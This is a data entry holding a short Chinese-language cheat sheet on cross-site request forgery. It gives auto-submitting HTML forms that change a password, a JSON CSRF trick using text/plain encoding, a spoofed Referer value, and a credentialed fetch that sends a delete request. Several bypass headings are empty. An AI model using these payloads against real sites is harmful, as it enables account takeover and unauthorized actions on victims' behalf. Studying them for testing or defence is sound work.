knowledge: "# CSRF跨站请求伪造\n\n## 1. 基础CSRF攻击\n\n```html\n<form action=\"http://target.com/change-password\" method=\"POST\"\
  >\n<input type=\"hidden\" name=\"password\" value=\"hacked\">\n</form>\n<script>document.forms[0].submit()</script>\n```\n\
  \n## 2. JSON CSRF\n\n```html\n<form action=\"http://target.com/api/update\" method=\"POST\" enctype=\"text/plain\">\n<input\
  \ name='{\"password\":\"hacked\",\"ignore\":\"'>\n</form>\n<script>document.forms[0].submit()</script>\n```\n\n## 3. SameSite绕过\n\
  \n### 顶级域名跨站\n\n### POST请求利用\n\n### 二级域名cookie\n\n## 4. Token绕过\n\n### Token泄露\n\n### Token固定\n\n### CORS绕过获取Token\n\n##\
  \ 5. Referer绕过\n\n```\nReferer: http://target.com-attacker.com\n```\n\n## 6. CORS配置错误\n\n```javascript\nfetch('http://target.com/api',\
  \ {\n  method: 'POST',\n  credentials: 'include',\n  body: JSON.stringify({action: 'delete'})\n})\n```\n"
